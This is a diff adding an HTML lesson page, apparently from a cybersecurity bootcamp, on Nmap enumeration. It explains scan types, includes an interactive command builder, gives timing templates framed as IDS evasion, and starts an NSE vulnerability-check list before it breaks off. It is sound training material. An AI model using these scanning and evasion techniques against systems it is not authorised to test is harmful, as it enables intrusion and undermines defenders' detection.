@@ -1,0 +1,1752 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Cybersecurity Bootcamp — Phase 2, Week 3</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&family=DM+Sans:wght@300;400;500;600;700&family=Bebas+Neue&display=swap');
+
+:root {
+  --bg:        #060810;
+  --surface:   #0b0e1a;
+  --card:      #0f1320;
+  --border:    #182038;
+  --accent:    #e8ff00;      /* acid yellow — the signature risk */
+  --accent2:   #ff3c5a;
+  --accent3:   #00cfff;
+  --purple:    #b06eff;
+  --green:     #00e676;
+  --text:      #c0cce8;
+  --muted:     #3d4f70;
+  --mono:      'Space Mono', monospace;
+  --sans:      'DM Sans', sans-serif;
+  --display:   'Bebas Neue', sans-serif;
+}
+
+*{margin:0;padding:0;box-sizing:border-box;}
+body{background:var(--bg);color:var(--text);font-family:var(--sans);font-size:15px;line-height:1.7;min-height:100vh;}
+
+/* Radar-sweep ambient background */
+body::after{
+  content:'';position:fixed;top:-30vw;right:-30vw;
+  width:80vw;height:80vw;border-radius:50%;
+  background:radial-gradient(circle,rgba(232,255,0,0.025) 0%,transparent 65%);
+  pointer-events:none;z-index:0;
+  animation:pulse 8s ease-in-out infinite;
+}
+@keyframes pulse{0%,100%{opacity:0.4;transform:scale(1);}50%{opacity:1;transform:scale(1.05);}}
+
+/* ── HEADER ── */
+header{
+  background:rgba(6,8,16,0.97);
+  border-bottom:1px solid var(--border);
+  padding:0 2rem;position:sticky;top:0;z-index:200;
+}
+.h-inner{
+  max-width:1140px;margin:0 auto;
+  display:flex;align-items:center;justify-content:space-between;
+  height:58px;
+}
+.logo{
+  font-family:var(--display);
+  font-size:1.5rem;letter-spacing:0.06em;color:#fff;
+}
+.logo em{color:var(--accent);font-style:normal;}
+.phase-chip{
+  font-family:var(--mono);font-size:0.65rem;
+  color:var(--accent);border:1px solid rgba(232,255,0,0.35);
+  padding:4px 14px;letter-spacing:0.14em;
+  background:rgba(232,255,0,0.06);
+}
+
+/* ── HERO ── */
+.hero{
+  max-width:1140px;margin:0 auto;
+  padding:4rem 2rem 3rem;position:relative;z-index:1;
+}
+.eyebrow{
+  font-family:var(--mono);font-size:0.68rem;
+  color:var(--muted);letter-spacing:0.3em;margin-bottom:1rem;
+}
+.hero h1{
+  font-family:var(--display);
+  font-size:clamp(2.5rem,7vw,5.5rem);
+  color:#fff;line-height:0.95;
+  letter-spacing:0.02em;margin-bottom:1.2rem;
+}
+.hero h1 .acid{color:var(--accent);}
+.hero-sub{
+  max-width:560px;color:var(--muted);
+  font-size:0.93rem;margin-bottom:2rem;
+  line-height:1.75;
+}
+.hero-tags{display:flex;gap:0.5rem;flex-wrap:wrap;}
+.htag{
+  font-family:var(--mono);font-size:0.65rem;
+  padding:4px 12px;border-radius:2px;letter-spacing:0.07em;
+}
+.ht-y{background:rgba(232,255,0,0.1);color:var(--accent);border:1px solid rgba(232,255,0,0.25);}
+.ht-r{background:rgba(255,60,90,0.1);color:var(--accent2);border:1px solid rgba(255,60,90,0.25);}
+.ht-b{background:rgba(0,207,255,0.08);color:var(--accent3);border:1px solid rgba(0,207,255,0.2);}
+.ht-p{background:rgba(176,110,255,0.1);color:var(--purple);border:1px solid rgba(176,110,255,0.25);}
+.ht-g{background:rgba(0,230,118,0.08);color:var(--green);border:1px solid rgba(0,230,118,0.2);}
+
+/* ── DAY NAV ── */
+.day-nav{
+  max-width:1140px;margin:0 auto;
+  padding:0 2rem;
+  display:flex;border-bottom:1px solid var(--border);
+  position:relative;z-index:1;overflow-x:auto;
+}
+.dtab{
+  font-family:var(--mono);font-size:0.7rem;
+  padding:13px 20px;border:none;
+  background:transparent;color:var(--muted);
+  cursor:pointer;border-bottom:2px solid transparent;
+  transition:all 0.18s;white-space:nowrap;letter-spacing:0.05em;
+}
+.dtab:hover{color:var(--text);}
+.dtab.active{color:var(--accent);border-bottom-color:var(--accent);}
+
+/* ── CONTENT ── */
+.wrap{max-width:1140px;margin:0 auto;padding:2.5rem 2rem;position:relative;z-index:1;}
+.panel{display:none;}.panel.active{display:block;}
+
+/* ── DAY HEADER ── */
+.dh{
+  display:grid;grid-template-columns:auto 1fr;
+  gap:1.5rem;align-items:start;
+  margin-bottom:2rem;padding-bottom:1.5rem;
+  border-bottom:1px solid var(--border);
+}
+.dnum{
+  font-family:var(--display);
+  font-size:5rem;line-height:0.85;
+  color:var(--accent);opacity:0.18;
+  letter-spacing:-0.02em;
+}
+.dtitle h2{
+  font-family:var(--display);font-size:1.6rem;
+  color:#fff;letter-spacing:0.04em;margin-bottom:0.4rem;
+}
+.dtitle p{color:var(--muted);font-size:0.86rem;}
+.stag{
+  font-family:var(--mono);font-size:0.6rem;
+  padding:3px 9px;margin-right:5px;border-radius:2px;letter-spacing:0.08em;
+}
+.s-th{background:rgba(176,110,255,0.12);color:var(--purple);border:1px solid rgba(176,110,255,0.25);}
+.s-lb{background:rgba(0,230,118,0.1);color:var(--green);border:1px solid rgba(0,230,118,0.25);}
+.s-tl{background:rgba(0,207,255,0.08);color:var(--accent3);border:1px solid rgba(0,207,255,0.2);}
+
+/* ── PROGRESS ── */
+.pbar-w{margin-bottom:2rem;}
+.pbar-l{font-family:var(--mono);font-size:0.65rem;color:var(--muted);letter-spacing:0.14em;margin-bottom:5px;}
+.pbar-t{height:2px;background:var(--border);}
+.pbar-f{height:100%;background:linear-gradient(90deg,var(--accent),var(--accent3));transition:width .5s ease;}
+
+/* ── CARD ── */
+.card{
+  background:var(--card);border:1px solid var(--border);
+  border-radius:4px;padding:1.5rem;margin-bottom:1.2rem;
+}
+.clbl{
+  font-family:var(--mono);font-size:0.65rem;
+  color:var(--accent);letter-spacing:0.2em;
+  margin-bottom:0.9rem;
+  display:flex;align-items:center;gap:0.7rem;
+}
+.clbl::before{content:'//';color:var(--muted);}
+.card h3{font-size:1rem;font-weight:600;color:#dde6ff;margin-bottom:0.5rem;}
+.card p{color:var(--text);font-size:0.88rem;margin-bottom:0.55rem;}
+.card p:last-child{margin-bottom:0;}
+
+/* ── TERMINAL ── */
+.term{
+  background:#02040a;border:1px solid var(--border);
+  border-radius:4px;overflow:hidden;margin:1rem 0;
+}
+.tbar{
+  background:#080b17;padding:7px 14px;
+  display:flex;align-items:center;gap:6px;
+  border-bottom:1px solid var(--border);
+}
+.d{width:9px;height:9px;border-radius:50%;}
+.dr{background:#ff5f56;}.dy{background:#ffbd2e;}.dg{background:#27c93f;}
+.ttl{font-family:var(--mono);font-size:0.65rem;color:var(--muted);margin-left:6px;letter-spacing:0.1em;}
+.tbody{
+  padding:1.2rem 1.4rem;font-family:var(--mono);
+  font-size:0.78rem;line-height:2;color:#5a7aaa;
+}
+.pr{color:var(--green);}.cm{color:#c8d8f0;}.co{color:#2d3f60;}
+.hi{color:var(--accent);}.hr{color:var(--accent2);}.hb{color:var(--accent3);}
+.hw{color:#ffc444;}.hp{color:var(--purple);}
+
+/* ── NMAP FLAG TABLE ── */
+.flag-grid{
+  display:grid;grid-template-columns:repeat(auto-fill,minmax(240px,1fr));
+  gap:0.8rem;margin:1rem 0;
+}
+.flag-card{
+  background:var(--card);border:1px solid var(--border);
+  border-left:3px solid var(--accent);
+  border-radius:3px;padding:1rem 1.1rem;
+}
+.flag-card.red{border-left-color:var(--accent2);}
+.flag-card.blue{border-left-color:var(--accent3);}
+.flag-card.purple{border-left-color:var(--purple);}
+.flag-card.green{border-left-color:var(--green);}
+.flag-name{font-family:var(--mono);font-size:0.82rem;font-weight:700;color:var(--accent);margin-bottom:0.3rem;}
+.flag-card.red .flag-name{color:var(--accent2);}
+.flag-card.blue .flag-name{color:var(--accent3);}
+.flag-card.purple .flag-name{color:var(--purple);}
+.flag-card.green .flag-name{color:var(--green);}
+.flag-desc{font-size:0.8rem;color:var(--muted);}
+
+/* ── TABLE ── */
+.tbl{width:100%;border-collapse:collapse;font-size:0.82rem;margin:1rem 0;}
+.tbl th{
+  background:var(--surface);color:var(--accent3);
+  font-family:var(--mono);font-size:0.65rem;letter-spacing:0.14em;
+  text-align:left;padding:9px 13px;border:1px solid var(--border);
+}
+.tbl td{padding:9px 13px;border:1px solid var(--border);color:var(--text);vertical-align:top;}
+.tbl tr:nth-child(even) td{background:rgba(255,255,255,0.015);}
+.tbl tr:hover td{background:rgba(232,255,0,0.03);}
+
+/* ── CALLOUT ── */
+.note{
+  display:flex;gap:1rem;align-items:flex-start;
+  padding:1rem 1.2rem;border-radius:3px;margin:1rem 0;font-size:0.86rem;
+}
+.ni{background:rgba(0,207,255,0.07);border:1px solid rgba(0,207,255,0.2);}
+.nw{background:rgba(255,196,68,0.07);border:1px solid rgba(255,196,68,0.22);}
+.nd{background:rgba(255,60,90,0.07);border:1px solid rgba(255,60,90,0.22);}
+.ng{background:rgba(0,230,118,0.06);border:1px solid rgba(0,230,118,0.2);}
+.ny{background:rgba(232,255,0,0.06);border:1px solid rgba(232,255,0,0.18);}
+.nico{font-size:1rem;line-height:1.6;flex-shrink:0;}
+.note p{color:var(--text);margin:0;} .note strong{color:#fff;}
+
+/* ── CHECKLIST ── */
+.ck{list-style:none;margin:0.8rem 0;}
+.ck li{
+  display:flex;align-items:flex-start;gap:0.7rem;
+  padding:0.42rem 0;font-size:0.86rem;color:var(--text);
+  border-bottom:1px solid rgba(255,255,255,0.04);
+}
+.ck li:last-child{border-bottom:none;}
+.ck li::before{content:'→';color:var(--accent);flex-shrink:0;font-family:var(--mono);}
+
+/* ── QUIZ ── */
+.qblock{
+  background:var(--card);border:1px solid var(--border);
+  border-radius:4px;padding:1.4rem;margin-bottom:1rem;
+}
+.qt{font-size:0.9rem;font-weight:600;color:#dde6ff;margin-bottom:1rem;}
+.qopts{display:flex;flex-direction:column;gap:0.45rem;}
+.qo{
+  display:flex;align-items:flex-start;gap:0.65rem;
+  padding:0.6rem 1rem;border:1px solid var(--border);
+  border-radius:3px;cursor:pointer;font-size:0.82rem;color:var(--text);
+  transition:all 0.14s;user-select:none;
+}
+.qo:hover{border-color:var(--accent);color:#fff;background:rgba(232,255,0,0.04);}
+.qo.correct{border-color:var(--green);background:rgba(0,230,118,0.08);color:var(--green);}
+.qo.wrong{border-color:var(--accent2);background:rgba(255,60,90,0.07);color:var(--accent2);}
+.qk{font-family:var(--mono);font-size:0.68rem;color:var(--muted);min-width:16px;flex-shrink:0;padding-top:1px;}
+.qfb{margin-top:0.8rem;font-size:0.8rem;padding:0.6rem 1rem;border-radius:3px;display:none;}
+.qfb.show{display:block;}
+.qfb.correct{background:rgba(0,230,118,0.09);color:var(--green);border:1px solid rgba(0,230,118,0.25);}
+.qfb.wrong{background:rgba(255,60,90,0.09);color:var(--accent2);border:1px solid rgba(255,60,90,0.25);}
+
+/* ── SCAN COMPARISON TABLE ── */
+.scan-cmp{
+  display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));
+  gap:0.7rem;margin:1rem 0;
+}
+.scan-card{
+  background:var(--card);border:1px solid var(--border);
+  border-radius:3px;padding:0.9rem 1rem;
+}
+.scan-flag{font-family:var(--mono);font-size:0.9rem;font-weight:700;color:var(--accent);margin-bottom:0.3rem;}
+.scan-name{font-size:0.78rem;font-weight:600;color:#c8d8f0;margin-bottom:0.25rem;}
+.scan-how{font-size:0.74rem;color:var(--muted);margin-bottom:0.4rem;line-height:1.5;}
+.scan-badge{
+  font-family:var(--mono);font-size:0.62rem;
+  padding:2px 8px;border-radius:2px;
+}
+.sb-fast{background:rgba(0,230,118,0.1);color:var(--green);border:1px solid rgba(0,230,118,0.25);}
+.sb-slow{background:rgba(255,60,90,0.1);color:var(--accent2);border:1px solid rgba(255,60,90,0.25);}
+.sb-loud{background:rgba(255,196,68,0.1);color:#ffc444;border:1px solid rgba(255,196,68,0.25);}
+.sb-stealth{background:rgba(176,110,255,0.1);color:var(--purple);border:1px solid rgba(176,110,255,0.25);}
+
+/* ── INTERACTIVE NMAP BUILDER ── */
+.nmap-builder{
+  background:var(--card);border:1px solid var(--border);
+  border-radius:4px;padding:1.5rem;margin:1rem 0;
+}
+.nmap-builder h4{
+  font-family:var(--display);font-size:1.1rem;
+  color:var(--accent);letter-spacing:0.05em;margin-bottom:1rem;
+}
+.nb-grid{display:flex;flex-wrap:wrap;gap:0.5rem;margin-bottom:1rem;}
+.nb-opt{
+  font-family:var(--mono);font-size:0.72rem;
+  padding:6px 14px;border:1px solid var(--border);
+  border-radius:3px;cursor:pointer;color:var(--muted);
+  transition:all 0.14s;user-select:none;background:var(--surface);
+}
+.nb-opt:hover{border-color:var(--accent);color:var(--accent);}
+.nb-opt.sel{border-color:var(--accent);color:var(--accent);background:rgba(232,255,0,0.08);}
+.nb-target{
+  background:var(--surface);border:1px solid var(--border);
+  color:#fff;font-family:var(--mono);font-size:0.85rem;
+  padding:8px 12px;border-radius:3px;width:220px;outline:none;
+  transition:border-color .2s;
+}
+.nb-target:focus{border-color:var(--accent);}
+.nb-out{
+  background:#02040a;border:1px solid var(--border);
+  border-radius:3px;padding:1rem 1.2rem;
+  font-family:var(--mono);font-size:0.82rem;
+  color:var(--accent);min-height:44px;
+  display:flex;align-items:center;
+  flex-wrap:wrap;gap:0.3rem;
+  word-break:break-all;
+}
+.nb-run{
+  background:rgba(232,255,0,0.12);border:1px solid var(--accent);
+  color:var(--accent);font-family:var(--mono);font-size:0.75rem;
+  padding:6px 16px;border-radius:3px;cursor:pointer;
+  margin-top:0.7rem;letter-spacing:0.08em;
+  transition:all .15s;
+}
+.nb-run:hover{background:rgba(232,255,0,0.22);}
+.nb-explain{
+  margin-top:0.7rem;font-size:0.8rem;color:var(--muted);
+  line-height:1.6;min-height:20px;
+}
+
+/* ── NSE SCRIPT CARDS ── */
+.nse-grid{
+  display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));
+  gap:0.9rem;margin:1rem 0;
+}
+.nse-card{
+  background:var(--card);border:1px solid var(--border);
+  border-top:2px solid var(--accent3);border-radius:3px;padding:1.1rem;
+}
+.nse-name{font-family:var(--mono);font-size:0.78rem;font-weight:700;color:var(--accent3);margin-bottom:0.3rem;}
+.nse-cat{font-family:var(--mono);font-size:0.62rem;color:var(--muted);margin-bottom:0.5rem;}
+.nse-desc{font-size:0.8rem;color:var(--text);margin-bottom:0.5rem;}
+.nse-cmd{
+  font-family:var(--mono);font-size:0.72rem;
+  background:#02040a;border:1px solid var(--border);
+  border-radius:2px;padding:4px 8px;color:var(--accent);
+  word-break:break-all;
+}
+
+/* ── WEB RECON FLOW ── */
+.flow-steps{
+  display:flex;flex-direction:column;gap:0;
+  margin:1rem 0;border:1px solid var(--border);border-radius:4px;overflow:hidden;
+}
+.flow-step{
+  display:grid;grid-template-columns:44px 1fr;
+  border-bottom:1px solid var(--border);
+}
+.flow-step:last-child{border-bottom:none;}
+.fs-num{
+  background:var(--surface);
+  font-family:var(--display);font-size:1.4rem;
+  color:var(--accent);display:flex;align-items:center;
+  justify-content:center;opacity:0.5;
+  border-right:1px solid var(--border);
+}
+.fs-body{padding:1rem 1.2rem;}
+.fs-title{font-weight:600;color:#dde6ff;font-size:0.9rem;margin-bottom:0.3rem;}
+.fs-desc{font-size:0.82rem;color:var(--muted);}
+.fs-cmd{
+  font-family:var(--mono);font-size:0.75rem;
+  color:var(--accent);background:rgba(232,255,0,0.05);
+  border:1px solid rgba(232,255,0,0.15);
+  border-radius:2px;padding:3px 8px;margin-top:0.4rem;
+  display:inline-block;
+}
+
+/* ── BLOODHOUND VISUAL ── */
+.ad-map{
+  background:var(--card);border:1px solid var(--border);
+  border-radius:4px;padding:1.5rem;margin:1rem 0;
+  font-family:var(--mono);font-size:0.78rem;
+  line-height:2.2;color:#4a6080;
+}
+.ad-node-da{color:var(--accent2);font-weight:700;}
+.ad-node-admin{color:var(--accent);}
+.ad-node-user{color:var(--accent3);}
+.ad-node-comp{color:var(--purple);}
+.ad-edge{color:var(--muted);}
+.ad-title{font-size:0.65rem;letter-spacing:0.2em;color:var(--muted);margin-bottom:0.8rem;}
+
+/* ── BURP SUITE DEMO ── */
+.burp-window{
+  background:#0d0e12;border:1px solid var(--border);
+  border-radius:4px;overflow:hidden;margin:1rem 0;
+}
+.burp-bar{
+  background:#1a1b2e;padding:7px 14px;
+  font-family:var(--mono);font-size:0.67rem;
+  color:var(--accent3);border-bottom:1px solid var(--border);
+  display:flex;gap:1rem;align-items:center;
+}
+.burp-tab{color:var(--muted);}
+.burp-tab.active{color:var(--accent3);}
+.burp-body{
+  display:grid;grid-template-columns:1fr 1fr;
+  gap:0;min-height:220px;
+}
+.burp-pane{padding:1rem 1.2rem;font-family:var(--mono);font-size:0.74rem;line-height:1.9;}
+.burp-pane:first-child{border-right:1px solid var(--border);}
+.burp-pane-title{color:var(--muted);font-size:0.62rem;letter-spacing:0.15em;margin-bottom:0.5rem;}
+.req-method{color:var(--accent2);}
+.req-path{color:#fff;}
+.req-header{color:var(--accent3);}
+.req-value{color:var(--purple);}
+.req-body{color:var(--accent);}
+.resp-status{color:var(--green);}
+.resp-header{color:var(--accent3);}
+.resp-body{color:var(--muted);}
+
+/* ── SECTION LABEL ── */
+.slbl{
+  font-family:var(--mono);font-size:0.65rem;color:var(--muted);
+  letter-spacing:0.24em;margin:2rem 0 0.8rem;
+}
+
+/* ── TWO COL ── */
+.two{display:grid;grid-template-columns:1fr 1fr;gap:1rem;}
+@media(max-width:680px){.two{grid-template-columns:1fr;}.burp-body{grid-template-columns:1fr;}.dnum{font-size:3rem;}}
+
+/* HELPERS */
+.hl{color:var(--accent);font-weight:600;}
+.hlr{color:var(--accent2);font-weight:600;}
+.hlb{color:var(--accent3);font-weight:600;}
+.hlg{color:var(--green);font-weight:600;}
+.hlp{color:var(--purple);font-weight:600;}
+.hlw{color:#ffc444;font-weight:600;}
+
+/* ── FOOTER ── */
+footer{
+  border-top:1px solid var(--border);
+  padding:1.5rem 2rem;text-align:center;
+  font-family:var(--mono);font-size:0.67rem;
+  color:var(--muted);letter-spacing:0.1em;
+  max-width:1140px;margin:2rem auto 0;position:relative;z-index:1;
+}
+</style>
+<link rel="stylesheet" href="../css/shared.css"/>
+</head>
+<body>
+<nav class="breadcrumb" style="background:var(--surface,#090c12);border-bottom-color:var(--border,#141b26);color:var(--muted,#253040);">
+  <a href="../index.html" style="color:var(--accent,#3b82f6);">LESSON HUB</a>
+  <span>/</span>
+  <span style="color:var(--text,#b0c0d8);">Phase 2</span>
+  <span>/</span>
+  <span style="color:#fff;">Week 3</span>
+</nav>
+
+<header>
+  <div class="h-inner">
+    <div class="logo">CYBER<em>BOOT</em>CAMP</div>
+    <div class="phase-chip">PHASE 2 · WEEK 3 · ENUMERATION & SCANNING</div>
+  </div>
+</header>
+
+<div class="hero">
+  <div class="eyebrow">// PHASE 2 — ENUMERATION & EXPLOITATION → WEEK 3 OF 4</div>
+  <h1>ENUMERATE<br><span class="acid">EVERYTHING.</span></h1>
+  <p class="hero-sub">Seven days of aggressive reconnaissance — Nmap's every scan type, web directory brute-forcing, vulnerability scanning, Active Directory bloodhound mapping, and Burp Suite setup. After this week you will find attack surface that most defenders don't know exists.</p>
+  <div class="hero-tags">
+    <span class="htag ht-y">Nmap Mastery</span>
+    <span class="htag ht-b">NSE Scripts</span>
+    <span class="htag ht-r">Gobuster / ffuf</span>
+    <span class="htag ht-g">OpenVAS / Nessus</span>
+    <span class="htag ht-p">BloodHound</span>
+    <span class="htag ht-y">Burp Suite</span>
+    <span class="htag ht-b">AD Recon</span>
+  </div>
+</div>
+
+<div class="day-nav">
+  <button class="dtab active" onclick="show(0)">Day 15 — Nmap Mastery</button>
+  <button class="dtab" onclick="show(1)">Day 16 — Web Recon</button>
+  <button class="dtab" onclick="show(2)">Day 17 — Vuln Scanning</button>
+  <button class="dtab" onclick="show(3)">Day 18 — AD Recon</button>
+  <button class="dtab" onclick="show(4)">Day 19 — Web App Fundamentals</button>
+  <button class="dtab" onclick="show(5)">Day 20 — Burp Suite</button>
+  <button class="dtab" onclick="show(6)">Day 21 — Full Lab Day</button>
+</div>
+
+<div class="wrap">
+
+<!-- ════════════════ DAY 15 ════════════════ -->
+<div class="panel active" id="p0">
+  <div class="dh">
+    <div class="dnum">15</div>
+    <div class="dtitle">
+      <h2>NMAP MASTERY</h2>
+      <p><span class="stag s-tl">TOOL</span><span class="stag s-lb">LAB</span> Host Discovery · Scan Types · Service Detection · OS Fingerprinting</p>
+    </div>
+  </div>
+
+  <div class="pbar-w">
+    <div class="pbar-l">WEEK 3 PROGRESS — DAY 15 OF 21</div>
+    <div class="pbar-t"><div class="pbar-f" style="width:71%"></div></div>
+  </div>
+
+  <div class="note ni">
+    <div class="nico">🎯</div>
+    <p><strong>Nmap is the most important tool in your arsenal.</strong> Network Mapper has been the de facto standard for network discovery and security auditing since 1997. Every professional engagement starts here. Not knowing nmap deeply is like being a surgeon who doesn't know anatomy — you can use the scalpel, but you'll cut the wrong things.</p>
+  </div>
+
+  <div class="slbl">// 15.1 — SCAN TYPE DEEP DIVE</div>
+
+  <div class="scan-cmp">
+    <div class="scan-card">
+      <div class="scan-flag">-sS</div>
+      <div class="scan-name">SYN "Stealth" Scan</div>
+      <div class="scan-how">Sends SYN → gets SYN-ACK (open) or RST (closed) → sends RST. Never completes handshake. Not logged by many apps.</div>
+      <div class="scan-badge sb-fast">FAST</div> <div class="scan-badge sb-stealth">STEALTHY</div>
+    </div>
+    <div class="scan-card">
+      <div class="scan-flag">-sT</div>
+      <div class="scan-name">Full Connect Scan</div>
+      <div class="scan-how">Completes full TCP 3-way handshake. Slower, fully logged. Used when SYN scan requires root privilege that you don't have.</div>
+      <div class="scan-badge sb-slow">SLOW</div> <div class="scan-badge sb-loud">LOUD</div>
+    </div>
+    <div class="scan-card">
+      <div class="scan-flag">-sU</div>
+      <div class="scan-name">UDP Scan</div>
+      <div class="scan-how">Probes UDP ports. Very slow — UDP has no handshake, must wait for ICMP "port unreachable" to know closed. DNS(53), SNMP(161) run on UDP.</div>
+      <div class="scan-badge sb-slow">VERY SLOW</div>
+    </div>
+    <div class="scan-card">
+      <div class="scan-flag">-sN</div>
+      <div class="scan-name">NULL Scan</div>
+      <div class="scan-how">Sends packet with NO flags set. Open/filtered ports don't respond. Closed ports send RST. Evades some stateless firewalls and older IDS.</div>
+      <div class="scan-badge sb-stealth">EVASION</div>
+    </div>
+    <div class="scan-card">
+      <div class="scan-flag">-sF</div>
+      <div class="scan-name">FIN Scan</div>
+      <div class="scan-how">Sends only FIN flag. Same logic as NULL — used against systems where SYN scans are blocked. Doesn't work on Windows (always sends RST).</div>
+      <div class="scan-badge sb-stealth">EVASION</div>
+    </div>
+    <div class="scan-card">
+      <div class="scan-flag">-sX</div>
+      <div class="scan-name">Xmas Scan</div>
+      <div class="scan-how">Sets FIN + URG + PUSH flags (all "lit up" like a Christmas tree). Same behavior as NULL/FIN. Bypass some packet filters.</div>
+      <div class="scan-badge sb-stealth">EVASION</div>
+    </div>
+    <div class="scan-card">
+      <div class="scan-flag">-sV</div>
+      <div class="scan-name">Version Detection</div>
+      <div class="scan-how">Probes open ports to determine exact service + version. "Port 80 open" becomes "Apache httpd 2.4.51". Critical for finding vulnerable software versions.</div>
+      <div class="scan-badge sb-loud">LOUD</div>
+    </div>
+    <div class="scan-card">
+      <div class="scan-flag">-O</div>
+      <div class="scan-name">OS Detection</div>
+      <div class="scan-how">Sends TCP/IP probes and analyzes responses to fingerprint the OS. TTL values, TCP window sizes, and flag behaviors all reveal OS identity.</div>
+      <div class="scan-badge sb-loud">LOUD</div>
+    </div>
+    <div class="scan-card">
+      <div class="scan-flag">-sn</div>
+      <div class="scan-name">Ping Sweep (No Port Scan)</div>
+      <div class="scan-how">Discovers live hosts without scanning ports. ICMP echo + TCP SYN to 443 + TCP ACK to 80 + ICMP timestamp. Fast host discovery.</div>
+      <div class="scan-badge sb-fast">FAST</div>
+    </div>
+  </div>
+
+  <!-- Interactive Nmap Builder -->
+  <div class="nmap-builder">
+    <h4>⚡ INTERACTIVE NMAP COMMAND BUILDER</h4>
+    <p style="font-size:0.8rem;color:var(--muted);margin-bottom:1rem;">Click options to build your command. Enter a target IP to complete it.</p>
+
+    <div style="margin-bottom:0.8rem;">
+      <div style="font-family:var(--mono);font-size:0.65rem;color:var(--muted);letter-spacing:0.14em;margin-bottom:0.5rem;">SCAN TYPE</div>
+      <div class="nb-grid">
+        <div class="nb-opt" data-flag="-sS" data-group="scan" onclick="toggleFlag(this)">-sS (SYN Stealth)</div>
+        <div class="nb-opt" data-flag="-sT" data-group="scan" onclick="toggleFlag(this)">-sT (Full Connect)</div>
+        <div class="nb-opt" data-flag="-sU" data-group="scan" onclick="toggleFlag(this)">-sU (UDP)</div>
+        <div class="nb-opt" data-flag="-sV" data-group="scan" onclick="toggleFlag(this)">-sV (Version)</div>
+        <div class="nb-opt" data-flag="-sn" data-group="scan" onclick="toggleFlag(this)">-sn (Ping Sweep)</div>
+      </div>
+    </div>
+
+    <div style="margin-bottom:0.8rem;">
+      <div style="font-family:var(--mono);font-size:0.65rem;color:var(--muted);letter-spacing:0.14em;margin-bottom:0.5rem;">DISCOVERY & DETECTION</div>
+      <div class="nb-grid">
+        <div class="nb-opt" data-flag="-O" onclick="toggleFlag(this)">-O (OS Detect)</div>
+        <div class="nb-opt" data-flag="-A" onclick="toggleFlag(this)">-A (Aggressive)</div>
+        <div class="nb-opt" data-flag="-Pn" onclick="toggleFlag(this)">-Pn (Skip Ping)</div>
+        <div class="nb-opt" data-flag="--open" onclick="toggleFlag(this)">--open (Open only)</div>
+      </div>
+    </div>
+
+    <div style="margin-bottom:0.8rem;">
+      <div style="font-family:var(--mono);font-size:0.65rem;color:var(--muted);letter-spacing:0.14em;margin-bottom:0.5rem;">PORT SELECTION</div>
+      <div class="nb-grid">
+        <div class="nb-opt" data-flag="-p 80,443,22,21" onclick="toggleFlag(this)">Common Ports</div>
+        <div class="nb-opt" data-flag="-p 1-1000" onclick="toggleFlag(this)">Port 1–1000</div>
+        <div class="nb-opt" data-flag="-p-" onclick="toggleFlag(this)">All 65535 Ports</div>
+        <div class="nb-opt" data-flag="--top-ports 1000" onclick="toggleFlag(this)">Top 1000 Ports</div>
+      </div>
+    </div>
+
+    <div style="margin-bottom:0.8rem;">
+      <div style="font-family:var(--mono);font-size:0.65rem;color:var(--muted);letter-spacing:0.14em;margin-bottom:0.5rem;">TIMING & OUTPUT</div>
+      <div class="nb-grid">
+        <div class="nb-opt" data-flag="-T4" onclick="toggleFlag(this)">-T4 (Fast)</div>
+        <div class="nb-opt" data-flag="-T1" onclick="toggleFlag(this)">-T1 (Sneaky)</div>
+        <div class="nb-opt" data-flag="-v" onclick="toggleFlag(this)">-v (Verbose)</div>
+        <div class="nb-opt" data-flag="-oA scan_results" onclick="toggleFlag(this)">-oA (Save All Formats)</div>
+        <div class="nb-opt" data-flag="--script=vuln" onclick="toggleFlag(this)">--script=vuln (NSE Vuln)</div>
+      </div>
+    </div>
+
+    <div style="display:flex;gap:0.6rem;align-items:center;flex-wrap:wrap;margin-bottom:0.8rem;">
+      <input class="nb-target" id="nmap-target" placeholder="Target: 192.168.56.101" oninput="buildCmd()"/>
+    </div>
+
+    <div class="nb-out" id="nmap-out">nmap <span style="color:var(--muted)">← select options above</span></div>
+    <button class="nb-run" onclick="explainCmd()">EXPLAIN THIS COMMAND</button>
+    <div class="nb-explain" id="nmap-explain"></div>
+  </div>
+
+  <div class="slbl">// 15.2 — NMAP TIMING TEMPLATES</div>
+
+  <table class="tbl">
+    <tr><th>TEMPLATE</th><th>NAME</th><th>SPEED</th><th>DETECTION RISK</th><th>USE CASE</th></tr>
+    <tr><td class="hl">-T0</td><td>Paranoid</td><td>~5 min/port</td><td>Near zero</td><td>IDS evasion — 1 probe per 5 minutes. Almost impossible to detect.</td></tr>
+    <tr><td class="hl">-T1</td><td>Sneaky</td><td>15 sec/port</td><td>Very low</td><td>Slow enough to evade most threshold-based IDS rules.</td></tr>
+    <tr><td class="hl">-T2</td><td>Polite</td><td>0.4 sec/port</td><td>Low</td><td>Reduces bandwidth — useful on slow networks.</td></tr>
+    <tr><td class="hl">-T3</td><td>Normal</td><td>Default</td><td>Medium</td><td>Default timing. Balanced speed vs detection.</td></tr>
+    <tr><td class="hlg">-T4</td><td>Aggressive</td><td>Fast</td><td>High</td><td>CTF / lab environments. Most pentesters use this.</td></tr>
+    <tr><td class="hlr">-T5</td><td>Insane</td><td>Very fast</td><td>Very high</td><td>Speed over accuracy. Will miss ports on slow/congested networks.</td></tr>
+  </table>
+
+  <div class="slbl">// 15.3 — NSE SCRIPTS (NMAP SCRIPTING ENGINE)</div>
+
+  <div class="card">
+    <div class="clbl">WHAT ARE NSE SCRIPTS?</div>
+    <p>NSE scripts extend nmap from a port scanner into a vulnerability scanner, brute-forcer, and service enumerator. There are 600+ built-in scripts covering authentication, brute force, discovery, DoS, exploitation, fuzzing, malware, safe, and version categories.</p>
+  </div>
+
+  <div class="nse-grid">
+    <div class="nse-card">
+      <div class="nse-name">http-title</div>
+      <div class="nse-cat">DISCOVERY</div>
+      <div class="nse-desc">Grabs the title of web pages. Quickly identifies what's running on HTTP/S ports without opening a browser.</div>
+      <div class="nse-cmd">nmap --script=http-title -p 80,443,8080 target</div>
+    </div>
+    <div class="nse-card">
+      <div class="nse-name">smb-vuln-ms17-010</div>
+      <div class="nse-cat">VULNERABILITY</div>
+      <div class="nse-desc">Checks if a host is vulnerable to EternalBlue (MS17-010) — the exploit used in WannaCry ransomware. One of the most critical checks.</div>
+      <div class="nse-cmd">nmap --script=smb-vuln-ms17-010 -p 445 target</div>
+    </div>
+    <div class="nse-card">
